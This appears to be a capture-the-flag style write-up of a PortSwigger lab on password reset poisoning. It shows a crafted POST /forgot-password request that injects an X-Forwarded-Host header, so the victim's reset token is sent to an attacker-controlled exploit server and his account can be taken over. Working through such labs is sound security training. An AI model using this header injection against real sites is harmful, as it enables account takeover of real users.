
# Password reset poisoning via middleware

This lab is vulnerable to password reset poisoning. The user carlos will carelessly click on any links in emails that he receives. To solve the lab, log in to Carlos's account. You can log in to your own account using the following credentials: wiener:peter. Any emails sent to this account can be read via the email client on the exploit server.

---------------------------------------------

References: 

- https://portswigger.net/web-security/authentication/other-mechanisms



![img](images/Password%20reset%20poisoning%20via%20middleware/1.png)

---------------------------------------------

A POST request is generated when trying to change the password:



![img](images/Password%20reset%20poisoning%20via%20middleware/2.png)


The link generated is “https://0a12001204e7e3e982ef202200a10043.web-security-academy.net/forgot-password?temp-forgot-password-token=JiMwnEiWPtqhfR5EAaUObelEM6CE11uK”:



![img](images/Password%20reset%20poisoning%20via%20middleware/3.png)


It is possible to poison the URL of the email using the header “X-Forwarded-Host”:

```
POST /forgot-password HTTP/2
...
X-Forwarded-Host: exploit-0a870063038466fd80799d71012c004f.exploit-server.net

username=carlos
```



![img](images/Password%20reset%20poisoning%20via%20middleware/4.png)


With this, there is a request to the exploit server:



![img](images/Password%20reset%20poisoning%20via%20middleware/5.png)


We can use this to change carlos' password:





![img](images/Password%20reset%20poisoning%20via%20middleware/6.png)
![img](images/Password%20reset%20poisoning%20via%20middleware/7.png)